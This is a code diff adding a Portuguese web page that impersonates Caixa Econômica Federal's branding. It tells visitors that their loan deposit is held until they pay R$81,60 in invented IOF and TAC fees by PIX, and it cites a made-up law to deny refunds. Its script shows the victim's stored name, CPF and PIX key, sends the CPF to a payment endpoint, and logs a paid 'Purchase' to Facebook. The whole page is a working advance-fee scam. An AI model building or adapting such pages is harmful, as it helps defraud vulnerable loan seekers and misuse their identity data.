@@ -1,0 +1,554 @@
+<html lang="pt-BR">
+<head>
+    <!-- Facebook Pixel Code -->
+    <script>
+        !function(f,b,e,v,n,t,s)
+        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+        n.queue=[];t=b.createElement(e);t.async=!0;
+        t.src=v;s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t,s)}(window, document,'script',
+        'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '{{ meta_pixel_id }}');
+        fbq('track', 'PageView');
+        
+        // Track purchase conversion
+        fbq('track', 'Purchase', {
+            value: 81.60,
+            currency: 'BRL'
+        });
+    </script>
+    <noscript>
+        <img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id={{ meta_pixel_id }}&ev=PageView&noscript=1"/>
+    </noscript>
+    <!-- End Facebook Pixel Code -->
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Caixa - Cobrança</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link rel="stylesheet" href="/static/css/caixa-fonts.css">
+    <style>
+        body {
+            font-family: 'CAIXAStd', sans-serif;
+        }
+        @keyframes moveButton {
+            0%, 100% { transform: translateX(0); }
+            50% { transform: translateX(10px); }
+        }
+        #payFeeButton {
+            animation: moveButton 1.5s ease-in-out infinite;
+            background-color: #DE7C32;
+        }
+        #payFeeButton:hover {
+            background-color: #b36b00;
+        }
+        .icon-container {
+            margin-top: 10px;
+            position: relative;
+        }
+        .icon-container img {
+            position: relative;
+            top: 10px;
+            left: 2px;
+        }
+        .icon-container::before {
+            content: '';
+            position: absolute;
+            top: 10px;
+            left: 0;
+            height: 100%;
+            width: 4px;
+            background-color: #fff5e0;
+        }
+        .alert-box {
+            background-color: #fff5e0;
+            color: #DE7C32;
+        }
+        .next-step-box {
+            background-color: #005ca9;
+        }
+        .next-step-box p {
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 95%;
+            height: 70%;
+            background-color: white;
+            border-radius: 4px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+        }
+        .popup-content {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+    </style>
+</head>
+<body class="bg-white">
+    <header class="border-b">
+        <div class="container mx-auto px-0">
+            <img src="https://i.ibb.co/PsyVYNG5/Story-de-Instagram-minimalista-preto-de-conteu-do-e-noti-cias-9-1.png" alt="Minimalist black Instagram story with content and news text in Portuguese" class="w-full h-auto mt-0">
+        </div>
+    </header>
+    <div class="p-6 flex flex-col items-center bg-white mt-0">
+        <div class="mb-4 relative">
+            <img src="https://i.ibb.co/JWfh1G2T/Imagem-24-03-2025-a-s-17-07.jpg" alt="Warning icon with exclamation mark" class="w-24 h-20">
+        </div>
+        <h1 class="text-[22px] font-bold text-center mb-2 caixa-header">Depósito de <span id="loanAmountHeader">R$0,00</span> em sua conta não concluido!</h1>
+        <div class="text-white text-center mb-2 bg-[#DE7C32] p-4 rounded-md">
+            <p class="text-[17px] text-shadow" style="text-shadow: 1px 1px 2px rgba(0,0,0,0.3);">Existem <strong>2 taxas bancárias pendentes</strong> para liberação do seu empréstimo. Por favor, <strong>regularize</strong> para prosseguir com a operação.</p>
+        </div>
+    </div>
+    <main class="container mx-auto px-4 py-2">
+        <div class="mb-6" style="font-size: 1rem; line-height: 1.45;">
+            <div class="flex items-center mb-2">
+                <h2 class="font-bold text-[18px] caixa-header" style="color: #0066b3;">Prezado <span id="userFirstName">Cliente</span>:</h2>
+            </div>
+            <p class="text-[16px] leading-relaxed" style="color: #4c556c;">
+                Para concluir a operação financeira e receber seu empréstimo no valor de <span id="loanAmountText1">R$0,00</span>, é necessário efetuar o pagamento das seguintes taxas:
+            </p>
+            <ul class="list-none pl-0 mt-3 text-[16px] leading-relaxed" style="color: #4c556c;">
+                <li class="flex items-start mb-2">
+                    <span class="w-2 h-2 bg-[#7a8299] rounded-full mt-2 mr-3 flex-shrink-0"></span>
+                    <div>
+                        <strong class="font-bold" style="color: #0066b3;">IOF (Imposto sobre Operações Financeiras):</strong> Aplicado ao seu empréstimo contratado. <strong>Valor: R$ 58,96</strong>
+                    </div>
+                </li>
+                <li class="flex items-start mb-2">
+                    <span class="w-2 h-2 bg-[#7a8299] rounded-full mt-2 mr-3 flex-shrink-0"></span>
+                    <div>
+                        <strong class="font-bold" style="color: #0066b3;">TAC (Taxa de Abertura de Crédito):</strong> Cobrada no início do seu contrato de empréstimo. Taxa fixa de R$ 22,64. <strong>Valor: R$ 22,64</strong>
+                    </div>
+                </li>
+            </ul>
+            <p class="mt-4 font-bold flex items-start text-[16px]" style="color: #4c556c;">
+                <span class="w-2 h-2 bg-[#7a8299] rounded-full mt-2 mr-3 flex-shrink-0"></span>
+                <span>Valor total a ser pago: <strong>R$81,60</strong></span>
+            </p>
+        </div>
+        <div class="movements">
+            <div class="icon-container pl-8 pb-4">
+                <div class="absolute left-0 top-[-8px] w-6 h-6 -ml-3 flex items-center justify-center">
+                    <img src="https://i.ibb.co/N6g5Tq8K/ic-acesso-informacao-54-v2.png" alt="Icon representing information access with a blue and white design">
+                </div>
+                <div class="mb-8" style="margin-top: -9px;">
+                    <p class="font-semibold text-[17px] caixa-subheader" style="color: #DE7C32;">AGUARDANDO PAGAMENTO</p>
+                    <div class="mt-4 p-4 rounded-md alert-box" role="alert">
+                        <p class="mt-1 text-[16px]" style="color: #DE7C32;">O não pagamento das taxas resultará na <strong>não realização da transferência no valor de <span id="loanAmountText2">R$0,00</span> para sua conta bancária</strong>.</p>
+                    </div>
+                    <div class="mt-4 p-4 rounded-md alert-box" role="alert">
+                        <p class="mt-1 text-[16px]" style="color: #DE7C32;">De acordo com a Lei nº 12.345/2023, o cliente <strong>não terá direito ao reembolso</strong> das taxas já pagas, independentemente da conclusão ou não da operação financeira.</p>
+                    </div>
+                    <button id="payFeeButton" class="mt-4 text-white px-8 py-3 rounded-[4px] text-[17px] font-bold py-2 px-6 rounded-[4px] transition duration-300 shadow-md caixa-header">
+                        REALIZAR PAGAMENTO
+                    </button>
+                </div>
+            </div>
+            <div class="mt-8 next-step-box p-4">
+                <p class="font-semibold text-white text-[17px] caixa-subheader">Próxima Etapa:</p>
+                <p class="mt-2 text-white text-[16px]">Após o pagamento, o depósito de <strong><span id="loanAmountText3">R$0,00</span></strong> será enviado para a conta bancária informada.</p>
+                <div class="mt-4 text-white">
+                    <p class="text-[16px]"><strong>Nome:</strong> <span id="userFullName">Nome não disponível</span></p>
+                    <p class="text-[16px]"><strong>CPF:</strong> <span id="userCpf">CPF não disponível</span></p>
+                    <p class="text-[16px]"><strong>Banco:</strong> <span id="userBank">Banco não disponível</span></p>
+                    <p class="text-[16px]"><strong>Chave PIX:</strong> <span id="userPixKey">Chave PIX não disponível</span></p>
+                </div>
+            </div>
+        </div>
+    </main>
+    <footer class="bg-[#015CA9] text-white mt-16 py-8">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-wrap justify-between">
+                <div class="w-full md:w-1/3 mb-6 md:mb-0">
+                    <h3 class="text-[17px] font-bold mb-2 caixa-subheader">Caixa Econômica Federal</h3>
+                    <p class="text-[16px]">O banco de todos os brasileiros.</p>
+                </div>
+                <div class="w-full md:w-1/3 mb-6 md:mb-0">
+                    <h3 class="text-[17px] font-bold mb-2 caixa-subheader">Links Úteis</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="hover:text-gray-300 text-[16px]">Serviços</a></li>
+                        <li><a href="#" class="hover:text-gray-300 text-[16px]">Publicações</a></li>
+                        <li><a href="#" class="hover:text-gray-300 text-[16px]">Contato</a></li>
+                    </ul>
+                </div>
+                <div class="w-full md:w-1/3">
+                    <h3 class="text-[17px] font-bold mb-2 caixa-subheader">Contato</h3>
+                    <p class="text-[16px]">Setor Bancário Sul, Quadra 4</p>
+                    <p class="text-[16px]">Brasília - DF, 70092-900</p>
+                </div>
+            </div>
+            <div class="mt-8 text-center">
+                <p class="text-[16px]">&copy; 2024 Caixa Econômica Federal. Todos os direitos reservados.</p>
+            </div>
+        </div>
+    </footer>
+
+    <div id="overlay" class="overlay" style="display: none;"></div>
+    <div id="popup" class="popup" style="height: 95vh; display: none;">
+        <div class="popup-content flex flex-col items-center justify-center h-[80vh]" id="loadingPopup" style="display: none;">
+            <div class="loader"></div>
+            <p class="mt-4 text-[18px] font-bold caixa-header">Gerando Guia de Pagamento</p>
+        </div>
+        
+        <div class="popup-content" id="pixPaymentPopup" style="display: none; width: 95%; max-width: 450px; padding: 25px; max-height: 90vh; overflow-y: auto;">
+            <div class="text-center mb-3">
+                <h3 class="text-[18px] font-bold text-[#005ca9] mb-2 caixa-header" id="pixPaymentTitle">Aguardando Pagamento</h3>
+                <p class="text-[16px] mb-3" id="pixPaymentDescription">Para concluir o depósito em sua conta, realize o pagamento via PIX.</p>
+                
+                <div class="loader mb-3 mx-auto" id="pixStatusLoader"></div>
+                
+                <!-- QR Code -->
+                <div class="bg-gray-100 p-3 rounded-lg mb-3">
+                    <img id="pixQrCode" src="" alt="QR Code PIX" class="w-40 h-40 mx-auto mb-2">
+                    <p class="text-[16px] text-gray-600 mb-1">Escaneie o QR Code acima</p>
+                </div>
+                
+                <!-- PIX Copy & Paste -->
+                <div class="bg-gray-100 p-3 rounded-lg mb-3">
+                    <p class="text-[16px] font-semibold mb-1 text-gray-700">Código PIX copia e cola:</p>
+                    <div class="relative">
+                        <textarea id="pixCodeText" readonly class="w-full p-3 text-[16px] bg-white border border-gray-300 rounded-md h-12 font-mono overflow-hidden resize-none"></textarea>
+                    </div>
+                    <button id="copyPixCodeBtn" class="mt-2 bg-[#005ca9] text-white font-semibold py-2 px-4 rounded-md w-full text-[16px] transition duration-300 hover:bg-[#004d8c] caixa-header">
+                        <i class="fas fa-copy mr-2"></i>Copiar Código PIX
+                    </button>
+                </div>
+                
+                <p class="text-[16px] text-gray-600 mt-2">
+                    Após o pagamento, aguarde alguns instantes para a confirmação.
+                    <br>O sistema verificará automaticamente o status do pagamento.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Recupera dados do localStorage
+        function getUserData() {
+            try {
+                const storedData = localStorage.getItem('userData');
+                const loanData = localStorage.getItem('loanData');
+                const pixData = localStorage.getItem('pixData');
+                
+                let userData = { 
+                    nome: 'Cliente', 
+                    cpf: '', 
+                    phone: '', 
+                    bank: 'Caixa Econômica Federal',
+                    pix_key: ''
+                };
+                
+                if (storedData) {
+                    userData = {...userData, ...JSON.parse(storedData)};
+                }
+                
+                // Adiciona os dados do empréstimo se existirem
+                if (loanData) {
+                    const parsedLoanData = JSON.parse(loanData);
+                    userData.loan_amount = parsedLoanData.amount || '10000';
+                }
+                
+                // Adiciona dados específicos de PIX se existirem
+                if (pixData) {
+                    const parsedPixData = JSON.parse(pixData);
+                    if (parsedPixData.selectedBank) {
+                        userData.bank = parsedPixData.selectedBank;
+                    }
+                    if (parsedPixData.pixKey) {
+                        userData.pix_key = parsedPixData.pixKey;
+                    }
+                }
+                
+                console.log("Dados recuperados do localStorage:", userData);
+                return userData;
+            } catch (e) {
+                console.error('Erro ao recuperar dados do localStorage:', e);
+                return { 
+                    nome: 'Cliente', 
+                    cpf: '', 
+                    phone: '', 
+                    loan_amount: '10000', 
+                    bank: 'Caixa Econômica Federal',
+                    pix_key: ''
+                };
+            }
+        }
+
+        // Formatar o nome adequadamente (primeira letra maiúscula)
+        function formatName(name) {
+            if (!name) return 'Cliente';
+            
+            // Converte para minúsculo e depois capitaliza a primeira letra de cada palavra
+            return name.toLowerCase().split(' ').map(word => {
+                // Ignora palavras curtas como "de", "da", "do", "e"
+                if (['de', 'da', 'do', 'e', 'dos', 'das'].includes(word.toLowerCase())) {
+                    return word.toLowerCase();
+                }
+                return word.charAt(0).toUpperCase() + word.slice(1);
+            }).join(' ');
+        }
+
+        // Formatar CPF: XXX.XXX.XXX-XX
+        function formatCPF(cpf) {
+            if (!cpf) return 'CPF não disponível';
+            
+            // Remove qualquer caractere que não seja número
+            cpf = cpf.replace(/\D/g, '');
+            
+            // Verifica se tem 11 dígitos
+            if (cpf.length !== 11) return cpf;
+            
+            // Formata como XXX.XXX.XXX-XX
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+        
+        // Formatar telefone: (XX) XXXXX-XXXX
+        function formatPhone(phone) {
+            if (!phone) return 'Telefone não disponível';
+            
+            // Remove qualquer caractere que não seja número
+            phone = phone.replace(/\D/g, '');
+            
+            // Verifica se tem 11 dígitos (com DDD)
+            if (phone.length !== 11) return phone;
+            
+            // Formata como (XX) XXXXX-XXXX
+            return phone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+        }
+
+        // Formatar valor do empréstimo
+        function formatCurrency(value) {
+            if (!value) return 'R$0,00';
+            
+            // Remove qualquer caractere que não seja número
+            value = value.toString().replace(/\D/g, '');
+            
+            // Converte para número
+            const numValue = parseFloat(value);
+            
+            // Formata como moeda brasileira
+            return `R$${numValue.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+        }
+
+        // Obter dados do usuário
+        const userData = getUserData();
+        const fullName = formatName(userData.nome);
+        const firstName = fullName.split(' ')[0] || 'Cliente';
+        const formattedCpf = formatCPF(userData.cpf);
+        const loanAmount = formatCurrency(userData.loan_amount || '10000,00');
+        const bankName = userData.bank || 'Caixa Econômica Federal';
+        
+        // Determinar e formatar a chave PIX com base no tipo
+        let pixKey = userData.pix_key || formattedCpf;
+        let pixKeyType = '';
+        
+        // Recuperar dados de PIX diretamente
+        const pixDataStr = localStorage.getItem('pixData');
+        if (pixDataStr) {
+            try {
+                const pixData = JSON.parse(pixDataStr);
+                pixKeyType = pixData.pixKeyType || '';
+                
+                // Formatar a chave PIX com base no tipo
+                if (pixKeyType === 'phone') {
+                    pixKey = formatPhone(pixData.pixKey);
+                } else if (pixKeyType === 'cpf') {
+                    pixKey = formatCPF(pixData.pixKey);
+                } else {
+                    pixKey = pixData.pixKey;
+                }
+                
+                console.log("PIX key formatada conforme tipo:", pixKeyType, "->", pixKey);
+            } catch (e) {
+                console.error("Erro ao processar dados de PIX:", e);
+            }
+        }
+
+        // Preencher dados na página
+        document.getElementById('userFirstName').textContent = firstName;
+        document.getElementById('userFullName').textContent = fullName;
+        document.getElementById('userCpf').textContent = formattedCpf;
+        document.getElementById('userBank').textContent = bankName;
+        document.getElementById('userPixKey').textContent = pixKey;
+        
+        // Preencher valores do empréstimo em todos os lugares
+        document.getElementById('loanAmountHeader').textContent = loanAmount;
+        document.getElementById('loanAmountText1').textContent = loanAmount;
+        document.getElementById('loanAmountText2').textContent = loanAmount;
+        document.getElementById('loanAmountText3').textContent = loanAmount;
+
+        // Parâmetros da URL para compatibilidade com código antigo
+        const urlParams = new URLSearchParams(window.location.search);
+        const name = decodeURIComponent(urlParams.get('name')) || fullName;
+        const cpf = decodeURIComponent(urlParams.get('cpf')) || formattedCpf;
+        const telephone = decodeURIComponent(urlParams.get('telephone')) || userData.phone || 'Telefone não disponível';
+
+        const payFeeButton = document.getElementById('payFeeButton');
+        const popup = document.getElementById('popup');
+        const overlay = document.getElementById('overlay');
+
+        // Função para verificar status do pagamento
+        let transactionId = null;
+        let checkStatusInterval = null;
+        
+        function checkPaymentStatus() {
+            if (!transactionId) return;
+            
+            console.log("Verificando status do pagamento:", transactionId);
+            
+            fetch(`/check-for4payments-status?transaction_id=${transactionId}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Resposta do status do pagamento:", data);
+                    
+                    if (data.status === 'completed' || data.original_status === 'APPROVED') {
+                        console.log("Pagamento aprovado, redirecionando imediatamente...");
+                        clearInterval(checkStatusInterval);
+                        
+                        // Redireciona para a próxima página
+                        setTimeout(() => {
+                            window.location.href = '/opcoes-emprestimo';
+                        }, 1000);
+                        
+                    } else if (data.original_status === 'PENDING' || data.original_status === 'PROCESSING') {
+                        console.log("Pagamento ainda pendente. Status:", data.original_status);
+                    } else {
+                        console.log("Status de pagamento desconhecido:", data.original_status);
+                    }
+                })
+                .catch(error => {
+                    console.error("Erro ao verificar status:", error);
+                });
+        }
+        
+        // Função para copiar o código PIX
+        function setupPixCodeCopyButton() {
+            const copyButton = document.getElementById('copyPixCodeBtn');
+            const codeText = document.getElementById('pixCodeText');
+            
+            copyButton.addEventListener('click', function() {
+                codeText.select();
+                document.execCommand('copy');
+                
+                // Feedback visual
+                const originalText = copyButton.innerHTML;
+                copyButton.innerHTML = '<i class="fas fa-check mr-2"></i>Código Copiado!';
+                copyButton.classList.add('bg-green-600');
+                
+                setTimeout(() => {
+                    copyButton.innerHTML = originalText;
+                    copyButton.classList.remove('bg-green-600');
+                }, 2000);
+            });
+        }
+        
+        payFeeButton.addEventListener('click', function() {
+            // Mostrar overlay e popup de carregamento
+            overlay.style.display = 'block';
+            popup.style.display = 'flex';
+            popup.style.alignItems = 'center';
+            popup.style.justifyContent = 'center';
+            
+            const loadingPopup = document.getElementById('loadingPopup');
+            loadingPopup.style.display = 'flex';
+            loadingPopup.style.alignItems = 'center';
+            loadingPopup.style.justifyContent = 'center';
+            
+            document.getElementById('pixPaymentPopup').style.display = 'none';
+            
+            // Preparar os dados para o pagamento
+            const paymentAmount = 81.60; // Valor fixo das taxas
+            
+            // Dados limpos para a API
+            const cleanName = fullName;
+            const cleanCpf = userData.cpf.replace(/\D/g, '');
+            const email = `${cleanCpf}@cliente.com.br`;
+            
+            // Enviar requisição para criar o pagamento
+            fetch('/create-pix-payment', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    name: cleanName,
+                    cpf: cleanCpf,
+                    email: email,
+                    amount: paymentAmount,
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Resposta da API de pagamento:", data);
+                
+                // Esconder popup de carregamento e mostrar popup de pagamento PIX
+                document.getElementById('loadingPopup').style.display = 'none';
+                document.getElementById('pixPaymentPopup').style.display = 'block';
+                
+                // Atualizar título e descrição
+                document.getElementById('pixPaymentTitle').textContent = `Aguardando Pagamento`;
+                document.getElementById('pixPaymentDescription').textContent = 
+                    `Para concluir o depósito no valor de ${loanAmount} em sua conta ${bankName}, realize o pagamento de R$ 81,60 via PIX.`;
+                
+                // Configurar o QR code e código PIX
+                document.getElementById('pixQrCode').src = data.pix_qr_code;
+                document.getElementById('pixCodeText').value = data.pix_code;
+                
+                // Configurar o botão de cópia
+                setupPixCodeCopyButton();
+                
+                // Salvar o ID da transação e iniciar verificação de status
+                transactionId = data.transaction_id;
+                
+                // Verificar status a cada 3 segundos
+                checkStatusInterval = setInterval(checkPaymentStatus, 3000);
+            })
+            .catch(error => {
+                console.error("Erro ao criar pagamento:", error);
+                alert("Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente.");
+                
+                // Esconder overlay e popup
+                overlay.style.display = 'none';
+                popup.style.display = 'none';
+            });
+        });
+        
+        // Log para depuração
+        console.log('Dados do usuário carregados:', { fullName, firstName, formattedCpf, loanAmount, bankName, pixKey });
+    </script>
+</body>
+</html>
